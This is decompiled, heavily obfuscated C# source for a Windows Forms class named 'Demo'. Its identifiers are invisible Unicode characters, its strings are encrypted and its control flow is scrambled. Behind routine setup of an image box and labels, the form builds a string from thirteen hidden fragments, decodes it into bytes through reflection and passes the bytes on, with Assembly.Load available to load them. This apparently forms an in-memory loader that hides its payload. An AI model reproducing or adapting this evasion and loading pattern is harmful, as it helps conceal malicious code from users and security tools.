            this.DDT = Demo.\u206D‪⁮⁭‏⁭⁬‎⁪‌⁯⁪‌‮​​⁪​​⁪⁫‮⁪‬‬‬⁯‮‮​‪‫‏‍‪‌‌‪‪‪‮(new string[13]
            {
              Demo.LocalX,
              Demo.LocalY,
              Demo.LocalZ,
              Demo.LocalA,
              Demo.LocalB,
              Demo.LocalC,
              Demo.LocalD,
              Demo.LocalE,
              Demo.LocalF,
              Demo.LocalG,
              Demo.LocalH,
              Demo.LocalI,
              Demo.LocalJ
            });
            this.DDT = Demo.\u206C‮⁭‌‪⁫⁫‎‌⁫‪⁯‍⁭‮⁪‬‮‬⁫⁬⁫‪⁪‫​‎‭‌⁪‍‍‎​‭‌⁫‏‎‫‮(this.DDT, \u003CModule\u003E.\u206C‮⁭‌‫⁪‍‏‫‎​⁫‬⁫‬⁭⁬⁯⁯‎‭⁭⁪⁮‭‎⁫‍‎⁫​⁬‫⁮⁮‪⁬​‍‭‮<string>(3354358892U), \u003CModule\u003E.\u200E⁯‪‎⁬‪⁪‍⁮‍‎‏‏‎‍⁯⁪⁮⁯⁭‫⁫‫‎‍‏​‬⁬⁫‎⁯​⁪‪‫⁯‮⁬⁫‮<string>(2748123500U));
            Demo.IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII((byte[]) Demo.\u200F‭‌‏‍‬‎​‮⁭‎⁫‮‮‍⁮⁪‭⁯‬⁪⁫‭⁬⁯‌⁪‬‪‪‫⁪‎⁯⁯‭‌⁬‏⁫‮(Demo.\u206C⁬⁭‪‏⁪‭⁪‪⁮‎⁭⁮‭‪‮‍‌‭⁫⁭⁭⁬‮‍⁭⁯‪‏‫⁪‫⁫⁯⁮‍⁫⁫‏‏‮(\u003CModule\u003E.\u200F‌‪‮⁫‍‫‎​‌‍‏​‍‏⁮‌‬‪⁪​‭‍‫‏⁮‫⁫‏‍​​‏⁭‫⁫‮‍‪⁫‮<string>(956066377U)), \u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(1431252976U), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
            {
              (object) this.DDT
            }));
            num1 = (int) num2 * -115827995 ^ 1917318774;
            continue;
          case 2:
            Demo.\u206A⁯⁬​⁫‫‏‌‍‍‏‪‭⁯⁯‮⁪‏⁫⁫⁭‪⁮⁭⁮⁭⁪‮⁬⁮⁫⁬‎‫⁯‏‮‍⁫‫‮((Control) this.Canvas, new Padding(5, 5, 5, 5));
            num1 = (int) num2 * -42229473 ^ 1613419365;
            continue;
          case 3:
            Demo.\u200E‍‫‫‏‎⁪‬⁪‏⁪‮‮⁫‌‪‭‎​‬‍‌‎⁭‌​‬‫‭‌⁪⁫⁯⁯⁬⁭⁮⁬⁮‪‮((Control) this.label2, \u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(1261870987U));
            num1 = (int) num2 * 2062958355 ^ 1813260842;
            continue;
          case 4:
            Demo.\u200F​‌‎‬‪‮‫‌‎⁫⁬⁮⁫‌‪‬⁭⁫⁭⁬⁮‭‮‌‪‎​‍‭⁮⁪‫⁮​⁯⁭‬‏‭‮((Control) this.label2, new Point(631, 11));
            num1 = (int) num2 * -1376364190 ^ 1806720237;
            continue;
          case 5:
            Demo.\u200C‏⁬‫⁭‬​⁪⁮​‎‏⁪‌⁯‏‬⁮⁭⁭⁯⁯‭⁪‬‎‫‮⁮⁫​‎⁮⁫‎⁪‫‍⁭‏‮((Control) this);
            num1 = (int) num2 * 1152600191 ^ 2088063823;
            continue;
          case 6:
            num1 = (int) num2 * 1561130904 ^ -729236953;
            continue;
          case 7:
            Demo.\u200C⁫‌‭‭‬⁬‫⁬‮‮⁫‏‪‬⁪⁯‭‬⁪⁮‎⁪⁪⁯⁮⁫‪​‭‪‏⁯⁮⁮‬‌⁬⁪‫‮(this.Canvas, (Image) Demo.\u206D‌‬‎​​‎​⁯⁮‍​‪⁭‮‮​‫‬⁯‮‌⁯‌‎‬‪‎‪‍‮‏‎‍‭‍‬‏‫‮‮((ResourceManager) componentResourceManager, \u003CModule\u003E.\u200F‌‪‮⁫‍‫‎​‌‍‏​‍‏⁮‌‬‪⁪​‭‍‫‏⁮‫⁫‏‍​​‏⁭‫⁫‮‍‪⁫‮<string>(315520397U)));
            Demo.\u200F​‌‎‬‪‮‫‌‎⁫⁬⁮⁫‌‪‬⁭⁫⁭⁬⁮‭‮‌‪‎​‍‭⁮⁪‫⁮​⁯⁭‬‏‭‮((Control) this.Canvas, new Point(0, 0));
            num1 = (int) num2 * 1514599831 ^ -1222165488;
            continue;
          case 8:
            Demo.\u206E​⁬⁯‮⁫‫‏‫‎‎⁯‌⁭‫⁬⁮⁭‏​⁬‭⁫⁮⁬⁫​‬‍‎‍⁯⁫⁪‭⁬⁮⁭⁮‮((Control) this.Canvas, DockStyle.Left);
            num1 = (int) num2 * -1769085554 ^ 825044074;
            continue;
          case 9:
            Demo.\u200E⁮‍‭‪⁫‌‍‏⁯⁬⁭⁪‎⁯‌⁮⁯‫⁭​‮⁫‪⁮⁪‎‫‪⁪‭‭⁭‬⁪⁯‭‏⁮⁬‮((Control) this.label2, \u003CModule\u003E.\u200E⁯‪‎⁬‪⁪‍⁮‍‎‏‏‎‍⁯⁪⁮⁯⁭‫⁫‫‎‍‏​‬⁬⁫‎⁯​⁪‪‫⁯‮⁬⁫‮<string>(1125598003U));
            num1 = (int) num2 * 627382505 ^ -1843114156;
            continue;
          case 10:
            this.lblLines = Demo.\u206B⁯‪⁬‫⁫‎‭⁭⁫‌‮⁮⁪‬‮‌‍‎​‪⁭‏‎⁯⁫‮⁫‫‭⁮⁯⁬⁭‭⁭‫⁮‭‪‮();
            num1 = (int) num2 * -1384549977 ^ -820382130;
            continue;
          case 11:
            num1 = (int) num2 * 1638286223 ^ 817204424;
            continue;
          case 12:
            num1 = (int) num2 * 1788701141 ^ -1740916981;
            continue;
          case 13:
            num1 = (int) num2 * -1559083599 ^ 1505246685;
            continue;
          case 14:
            Demo.\u200B⁮‫‬⁭‎‏⁬‍⁬‌⁯‌‌⁮⁫‎‬‍⁮⁪‭‏‌⁬‮‫​‌⁮‬‏‪‎‭‎‫⁭⁬‪‮((Control) this.panel1, Demo.\u206A​⁭⁯‎⁫⁭​‮⁮⁪‪⁭​⁮‎‬‭‪‬‫‌‮⁪⁬‎⁮‎‪‮‌‭⁮⁬‪⁭‭⁬⁫‭‮());
            num1 = (int) num2 * -1548257917 ^ 277971447;
            continue;
          case 15:
            Demo.\u200F⁭‍‎‏⁫⁫‏‬⁪⁬‌‏‫‬⁫​⁫‮⁭‪‌⁪⁬‪⁯⁮⁫⁬‮‏⁬‎‌⁯⁭‏‏‍⁭‮((Control) this.panel1);
            num1 = (int) num2 * 156274887 ^ 1872710732;
            continue;
          case 16:
            Demo.\u200D⁮⁮⁬‭⁬⁭⁯⁪‍‭⁭⁭‏‭‌‮‪‮⁮⁪‏⁯‏‌⁮‮⁮‭‮‫‭‫‌⁭⁪‍​‌‪‮((Control) this.label2, Demo.\u206F‮⁯‮⁯‏⁭‪‎⁫‎⁫⁫‮‪‭⁭‭⁯‭‫⁮⁯‌‮⁫‍​‍⁮‍⁮⁭‪‪‭​⁫‏⁯‮(\u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(4034557801U), 15f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0));
            num1 = (int) num2 * 1756843071 ^ -149919945;
            continue;
          case 17:
            Demo.\u202B⁭⁮‍​⁯⁭‬⁯⁭‍⁯⁬‪⁯‬⁫‫​‫‬‍‌⁪‭‫‫​‮⁯‍⁪⁭​‌‮⁮‫‌⁮‮((Control) this.label2, new Size(74, 29));
            Demo.\u200B‫⁯‏⁭‭‭‫‍‮​‌⁯⁪⁯​‫⁯⁪‏‏‫‎⁬‏‬⁪‮⁭‮‮​‫⁬‭⁬‬‏⁪⁬‮((Control) this.label2, 7);
            num1 = (int) num2 * -1064912273 ^ -637056116;
            continue;
          case 18:
            Demo.\u202B⁭⁮‍​⁯⁭‬⁯⁭‍⁯⁬‪⁯‬⁫‫​‫‬‍‌⁪‭‫‫​‮⁯‍⁪⁭​‌‮⁮‫‌⁮‮((Control) this.Canvas, new Size(533, 800));
            Demo.\u202B​‎‎‏⁬⁪‮‌‮⁫‌⁮​‭‍‫‎⁪⁯​‌‮⁮‬⁮‏⁪⁯⁫⁭⁪⁭⁬⁯⁪​‬‮‪‮((Control) this.label2, true);
            num1 = (int) num2 * -1421459653 ^ 774915955;
            continue;
          case 19:
            num1 = (int) num2 * 206415605 ^ 1472887020;
            continue;
          case 20:
            num1 = (int) num2 * -94995989 ^ 1595189856;
            continue;
          case 21:
            Demo.\u200C‏⁬‫⁭‬​⁪⁮​‎‏⁪‌⁯‏‬⁮⁭⁭⁯⁯‭⁪‬‎‫‮⁮⁫​‎⁮⁫‎⁪‫‍⁭‏‮((Control) this);
            Demo.\u202D⁫⁮⁬‪‭⁭‬‭​‍⁬⁫‌‌⁮‭‏‍⁭‏⁭⁪‏‬‎⁫​‬‭‎‍‌‫‪‮⁪⁯‌‌‮(this.Canvas, BorderStyle.FixedSingle);
            num1 = (int) num2 * 250969665 ^ 89428838;
            continue;
          case 22:
            this.btnImage = Demo.\u200D‮‫‌‬‭‬⁫‌‏‬‭‬⁪⁬‪‏‏‭‫‪‍⁪‌‏⁫‎⁯⁮‭⁪‭‬⁫‭⁮‌‪‬⁫‮();
            Demo.\u202A⁯‏⁬‎‬‏⁭‬‭‌​⁪‭⁭⁫⁫⁭‬‮‫‫‭‬‌⁫‎‬‎‮‍⁮⁪‌⁮​‭‬⁯‍‮((ISupportInitialize) this.Canvas);
            num1 = (int) num2 * -790280542 ^ 152595930;
            continue;
          case 23:
            Demo.\u202A⁯‏⁬‎‬‏⁭‬‭‌​⁪‭⁭⁫⁫⁭‬‮‫‫‭‬‌⁫‎‬‎‮‍⁮⁪‌⁮​‭‬⁯‍‮((ISupportInitialize) this.btnImage);
            num1 = (int) num2 * 923124335 ^ 804435372;
            continue;
          case 24:
            Demo.\u206A⁯⁬​⁫‫‏‌‍‍‏‪‭⁯⁯‮⁪‏⁫⁫⁭‪⁮⁭⁮⁭⁪‮⁬⁮⁫⁬‎‫⁯‏‮‍⁫‫‮((Control) this.label2, new Padding(4, 0, 4, 0));
            num1 = (int) num2 * -127198939 ^ -770312463;
            continue;
          case 25:
            goto label_1;
          case 26:
            goto label_3;
          case 27:
            num1 = (int) num2 * 48831433 ^ -1960656817;
            continue;
          case 28:
            num1 = (int) num2 * 1468042470 ^ 1439147715;
            continue;
          default:
            goto label_31;
        }
      }
label_3:
      return;
label_31:;
    }

    static Demo()
    {
label_1:
      int num1 = 119579475;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1596808077)) % 7U)
        {
          case 1:
            Demo.LocalB = \u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(2182162695U);
            num1 = (int) num2 * -675460322 ^ -2018451647;
            continue;
          case 2:
            goto label_1;
          case 3:
            Demo.LocalD = \u003CModule\u003E.\u200F‌‪‮⁫‍‫‎​‌‍‏​‍‏⁮‌‬‪⁪​‭‍‫‏⁮‫⁫‏‍​​‏⁭‫⁫‮‍‪⁫‮<string>(332034631U);
            Demo.LocalE = \u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(398795158U);
            Demo.LocalF = \u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(845469442U);
            Demo.LocalG = \u003CModule\u003E.\u202A‌‫⁫‫⁮⁫‍‫‮‮‍‭‭⁬⁯​‫‎‬⁫⁬⁬⁬⁪⁯‪⁪⁪​⁪⁫⁯‎⁯‬‫⁫‭⁪‮<string>(326516384U);
            num1 = (int) num2 * -148704272 ^ 688261208;
            continue;
          case 4:
            Demo.LocalC = \u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(3882464681U);
            num1 = (int) num2 * 336350626 ^ -69935382;
            continue;
          case 5:
            Demo.LocalZ = \u003CModule\u003E.\u206E‬‭‬⁪‭‏‫​‭‭‭‬‮⁯‮⁫​‮‏‮‍‍‏⁫‭‌⁭‭‬‪‭⁪‭⁯⁬‬⁫‮⁮‮<string>(1063349083U);
            num1 = (int) num2 * -778267578 ^ 664604351;
            continue;
          case 6:
            Demo.LocalA = \u003CModule\u003E.\u200E⁯‪‎⁬‪⁪‍⁮‍‎‏‏‎‍⁯⁪⁮⁯⁭‫⁫‫‎‍‏​‬⁬⁫‎⁯​⁪‪‫⁯‮⁬⁫‮<string>(725269643U);
            num1 = (int) num2 * 1578403472 ^ 5317478;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      Demo.LocalH = \u003CModule\u003E.\u200E⁯‪‎⁬‪⁪‍⁮‍‎‏‏‎‍⁯⁪⁮⁯⁭‫⁫‫‎‍‏​‬⁬⁫‎⁯​⁪‪‫⁯‮⁬⁫‮<string>(1551221498U);
      Demo.LocalI = \u003CModule\u003E.\u200E⁯‪‎⁬‪⁪‍⁮‍‎‏‏‎‍⁯⁪⁮⁯⁭‫⁫‫‎‍‏​‬⁬⁫‎⁯​⁪‪‫⁯‮⁬⁫‮<string>(1351853985U);
      Demo.LocalJ = \u003CModule\u003E.\u200E⁯‪‎⁬‪⁪‍⁮‍‎‏‏‎‍⁯⁪⁮⁯⁭‫⁫‫‎‍‏​‬⁬⁫‎⁯​⁪‪‫⁯‮⁬⁫‮<string>(812107623U);
    }

    static PropertyInfo[] \u206C‎‮‪⁯‏‭‌‮⁭‮⁮‍⁪​​‮‎‫‎⁬⁭‮‍‍‮⁪‪⁫‮⁮‭⁫‏‏⁫‮‫⁭‌‮([In] System.Type obj0) => obj0.GetProperties();

    static void \u200E‪⁭⁪‎⁪‮‍⁯⁮⁮‬‬‬⁪‭‪‍⁯‎⁮‫‪​⁪‫⁯⁭‎​⁪‬‮⁯‍‪‏⁪‏‌‮(
      [In] PropertyInfo obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object[] obj3)
    {
      obj0.SetValue(obj1, obj2, obj3);
    }

    static AppDomain \u200E‎‫⁮‎‬‍‪⁮‭‭‫‮‌‌⁮‪⁫⁯‫⁬‭⁭‬‬‫⁫⁭‍‌‪⁬‍⁬‭‮‪⁮‏⁬‮() => AppDomain.CurrentDomain;

    static string \u206F⁯⁭⁬‪‍⁫‏‬‫‏⁯‎‎‭‏⁬‬⁬‫⁮​⁪‮⁮​‪‪⁭​⁮⁯‎⁫‌‮⁫‬‎‬‮([In] AppDomain obj0) => obj0.BaseDirectory;

    static string \u206A⁯‮‬‭‪⁬‏‮‭‏⁪‮⁬⁭‫‪⁭‏‭‌​‪‎‏‪‏‍⁮⁫⁬‍⁫‪‫‮⁮⁫‍‮([In] string obj0, [In] string obj1) => Path.Combine(obj0, obj1);

    static string \u200C‫‎‌⁪⁮⁮⁯‬​​‏‪⁫‪⁪‌⁪‎‫‌‬‌‪‏​‮‮‍‫‭​‬‬‍‮⁫‍⁬‍‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static int \u206C‭⁮‌‎​⁭⁪‌⁬⁭‏‍‮‍⁮⁬​‌⁪‮‍‎‬‫‮⁭‬‭⁭​‏⁫⁪⁮‭⁮⁪‫‌‮([In] Control obj0) => obj0.Width;

    static void \u200E‎‬‏⁯‏‎‬‪⁭‎⁯‏⁫⁭⁪⁬‫‪⁬‫⁭⁮​‏‏⁮‫‬‍⁯‬‮‪‭‭⁬‬‭⁮‮([In] Form obj0, [In] Size obj1) => obj0.ClientSize = obj1;

    static Size \u200E​⁯‮‭⁫‪⁬‭⁮‫‏​⁭​⁬‮‏‌‫⁫‎‬‪‍⁪​‬⁫‮‪⁫‭‫⁮​⁫⁪⁮‬‮([In] Form obj0) => obj0.Size;

    static void \u206B‌‮​‪‎‪‌⁬‎⁫⁬‬‭‎⁫⁬‪⁪‎⁬‬⁭‭‏⁯⁫⁮‮⁫‭⁭⁪‎‏‪‌⁬⁭‍‮([In] Control obj0, [In] Size obj1) => obj0.MaximumSize = obj1;

    static void \u202B⁫‍‌‍‬‮⁯⁪​‌‪⁬⁬⁫⁯‭⁮‬‭‫‎​‏⁫‪‬‍‏‌‫‌‍‪‏‎‍⁪⁮⁬‮([In] Control obj0, [In] Size obj1) => obj0.MinimumSize = obj1;

    static Random \u206A‏⁫⁫‌⁯‍‎‬‬‪‪‮⁮​​⁭‫‎⁯‍⁭‌⁭‎⁫​​‬‪‬⁪​‭‏‌‬⁬‌‌‮([In] int obj0) => new Random(obj0);

    static int \u200D⁪⁯‎‮⁭‮‪⁯​⁯‮‎‭​‌‭‍‮⁬⁮‏⁫⁬‫⁭⁭‌⁪‭‎⁭‏‪⁮⁫⁯⁮‍⁮‮([In] Random obj0, [In] int obj1, [In] int obj2) => obj0.Next(obj1, obj2);

    static DialogResult \u200D‮‎‌‎⁬‏⁪‫​⁯⁬⁫‍‪⁮‌‪‎​‫​‮⁯‏​‪⁭‎‍​‮⁬‭⁯‌‭​‎‫‮([In] string obj0) => MessageBox.Show(obj0);

    static void \u200E⁮‍‭‪⁫‌‍‏⁯⁬⁭⁪‎⁯‌⁮⁯‫⁭​‮⁫‪⁮⁪‎‫‪⁪‭‭⁭‬⁪⁯‭‏⁮⁬‮([In] Control obj0, [In] string obj1) => obj0.Text = obj1;

    static void \u206F⁫‪‭‪‎‪‏‪‍⁭‌‭⁭‬⁪⁮⁮‎‮‍‭‍⁬⁫‫‫⁮‏​‍​‬⁫⁭⁫⁯‪‍‬‮([In] IDisposable obj0) => obj0.Dispose();

    static Assembly \u200F‍⁮⁬‎⁪⁪⁫​‪‫​‌‫‍‮‏​‎⁬‮⁯⁫‮‮‪⁪‬‪‌‎⁫‎​⁫​‮‭‍⁪‮([In] byte[] obj0) => Assembly.Load(obj0);

    static System.Type \u206D⁭‌⁭‎⁭‬‎‏‮⁭‬‏‏⁪‎‌‬‍⁯‫‪‏‎⁮‫‌⁪⁪‍‌⁪‫⁯‮⁭⁯⁭‍‪‮(
      [In] Assembly obj0,
      [In] string obj1)
    {
      return obj0.GetType(obj1);
    }

    static System.Type \u200C‎‍‫​‌⁪​‌‌‪⁯⁭‏‌‭‍⁬⁭‏‎‫⁪‍‌‎‍‌⁯‏​⁪‌‎‪⁫⁪‭⁪‪‮([In] RuntimeTypeHandle obj0) => System.Type.GetTypeFromHandle(obj0);

    static ComponentResourceManager \u202B‫⁮‏‪⁪​⁫⁫‮⁮‎​‫⁮⁯⁮‫‮‬‎⁮‌‎⁫⁬‍‏⁮‫‫‬‬⁫‪‌⁬‭‪‭‮(
      [In] System.Type obj0)
    {
      return new ComponentResourceManager(obj0);
    }

    static Label \u206B⁯‪⁬‫⁫‎‭⁭⁫‌‮⁮⁪‬‮‌‍‎​‪⁭‏‎⁯⁫‮⁫‫‭⁮⁯⁬⁭‭⁭‫⁮‭‪‮() => new Label();

    static Panel \u202C⁫‫‪‪‌‍⁪‍⁯‎⁮⁭⁬⁫‮‬‍⁬‌‌⁮‫‌⁮⁫‫​‏‏⁪‬‬⁭⁬⁯‎‏​‭‮() => new Panel();

    static PictureBox \u200D‮‫‌‬‭‬⁫‌‏‬‭‬⁪⁬‪‏‏‭‫‪‍⁪‌‏⁫‎⁯⁮‭⁪‭‬⁫‭⁮‌‪‬⁫‮() => new PictureBox();

    static void \u202A⁯‏⁬‎‬‏⁭‬‭‌​⁪‭⁭⁫⁫⁭‬‮‫‫‭‬‌⁫‎‬‎‮‍⁮⁪‌⁮​‭‬⁯‍‮([In] ISupportInitialize obj0) => obj0.BeginInit();

    static void \u200F⁭‍‎‏⁫⁫‏‬⁪⁬‌‏‫‬⁫​⁫‮⁭‪‌⁪⁬‪⁯⁮⁫⁬‮‏⁬‎‌⁯⁭‏‏‍⁭‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u200C‏⁬‫⁭‬​⁪⁮​‎‏⁪‌⁯‏‬⁮⁭⁭⁯⁯‭⁪‬‎‫‮⁮⁫​‎⁮⁫‎⁪‫‍⁭‏‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u202D⁫⁮⁬‪‭⁭‬‭​‍⁬⁫‌‌⁮‭‏‍⁭‏⁭⁪‏‬‎⁫​‬‭‎‍‌‫‪‮⁪⁯‌‌‮([In] PictureBox obj0, [In] BorderStyle obj1) => obj0.BorderStyle = obj1;

    static void \u206E​⁬⁯‮⁫‫‏‫‎‎⁯‌⁭‫⁬⁮⁭‏​⁬‭⁫⁮⁬⁫​‬‍‎‍⁯⁫⁪‭⁬⁮⁭⁮‮([In] Control obj0, [In] DockStyle obj1) => obj0.Dock = obj1;

    static object \u206D‌‬‎​​‎​⁯⁮‍​‪⁭‮‮​‫‬⁯‮‌⁯‌‎‬‪‎‪‍‮‏‎‍‭‍‬‏‫‮‮([In] ResourceManager obj0, [In] string obj1) => obj0.GetObject(obj1);

    static void \u200C⁫‌‭‭‬⁬‫⁬‮‮⁫‏‪‬⁪⁯‭‬⁪⁮‎⁪⁪⁯⁮⁫‪​‭‪‏⁯⁮⁮‬‌⁬⁪‫‮([In] PictureBox obj0, [In] Image obj1) => obj0.Image = obj1;

    static void \u200F​‌‎‬‪‮‫‌‎⁫⁬⁮⁫‌‪‬⁭⁫⁭⁬⁮‭‮‌‪‎​‍‭⁮⁪‫⁮​⁯⁭‬‏‭‮([In] Control obj0, [In] Point obj1) => obj0.Location = obj1;

    static void \u206A⁯⁬​⁫‫‏‌‍‍‏‪‭⁯⁯‮⁪‏⁫⁫⁭‪⁮⁭⁮⁭⁪‮⁬⁮⁫⁬‎‫⁯‏‮‍⁫‫‮([In] Control obj0, [In] Padding obj1) => obj0.Margin = obj1;

    static void \u202B⁭⁮‍​⁯⁭‬⁯⁭‍⁯⁬‪⁯‬⁫‫​‫‬‍‌⁪‭‫‫​‮⁯‍⁪⁭​‌‮⁮‫‌⁮‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u202B​‎‎‏⁬⁪‮‌‮⁫‌⁮​‭‍‫‎⁪⁯​‌‮⁮‬⁮‏⁪⁯⁫⁭⁪⁭⁬⁯⁪​‬‮‪‮([In] Control obj0, [In] bool obj1) => obj0.AutoSize = obj1;

    static Font \u206F‮⁯‮⁯‏⁭‪‎⁫‎⁫⁫‮‪‭⁭‭⁯‭‫⁮⁯‌‮⁫‍​‍⁮‍⁮⁭‪‪‭​⁫‏⁯‮(
      [In] string obj0,
      [In] float obj1,
      [In] FontStyle obj2,
      [In] GraphicsUnit obj3,
      [In] byte obj4)
    {
      return new Font(obj0, obj1, obj2, obj3, obj4);
    }

    static void \u200D⁮⁮⁬‭⁬⁭⁯⁪‍‭⁭⁭‏‭‌‮‪‮⁮⁪‏⁯‏‌⁮‮⁮‭‮‫‭‫‌⁭⁪‍​‌‪‮([In] Control obj0, [In] Font obj1) => obj0.Font = obj1;

    static void \u200E‍‫‫‏‎⁪‬⁪‏⁪‮‮⁫‌‪‭‎​‬‍‌‎⁭‌​‬‫‭‌⁪⁫⁯⁯⁬⁭⁮⁬⁮‪‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u200B‫⁯‏⁭‭‭‫‍‮​‌⁯⁪⁯​‫⁯⁪‏‏‫‎⁬‏‬⁪‮⁭‮‮​‫⁬‭⁬‬‏⁪⁬‮([In] Control obj0, [In] int obj1) => obj0.TabIndex = obj1;

    static Color \u206A​⁭⁯‎⁫⁭​‮⁮⁪‪⁭​⁮‎‬‭‪‬‫‌‮⁪⁬‎⁮‎‪‮‌‭⁮⁬‪⁭‭⁬⁫‭‮() => SystemColors.ControlLight;

    static void \u200B⁮‫‬⁭‎‏⁬‍⁬‌⁯‌‌⁮⁫‎‬‍⁮⁪‭‏‌⁬‮‫​‌⁮‬‏‪‎‭‎‫⁭⁬‪‮([In] Control obj0, [In] Color obj1) => obj0.BackColor = obj1;

    static string \u206D‪⁮⁭‏⁭⁬‎⁪‌⁯⁪‌‮​​⁪​​⁪⁫‮⁪‬‬‬⁯‮‮​‪‫‏‍‪‌‌‪‪‪‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206C‮⁭‌‪⁫⁫‎‌⁫‪⁯‍⁭‮⁪‬‮‬⁫⁬⁫‪⁪‫​‎‭‌⁪‍‍‎​‭‌⁫‏‎‫‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0.Replace(obj1, obj2);
    }

    static System.Type \u206C⁬⁭‪‏⁪‭⁪‪⁮‎⁭⁮‭‪‮‍‌‭⁫⁭⁭⁬‮‍⁭⁯‪‏‫⁪‫⁫⁯⁮‍⁫⁫‏‏‮([In] string obj0) => System.Type.GetType(obj0);

    static object \u200F‭‌‏‍‬‎​‮⁭‎⁫‮‮‍⁮⁪‭⁯‬⁪⁫‭⁬⁯‌⁪‬‪‪‫⁪‎⁯⁯‭‌⁬‏⁫‮(
      [In] System.Type obj0,
      [In] string obj1,
      [In] BindingFlags obj2,
      [In] Binder obj3,
      [In] object obj4,
      [In] object[] obj5)
    {
      return obj0.InvokeMember(obj1, obj2, obj3, obj4, obj5);
    }
  }
}
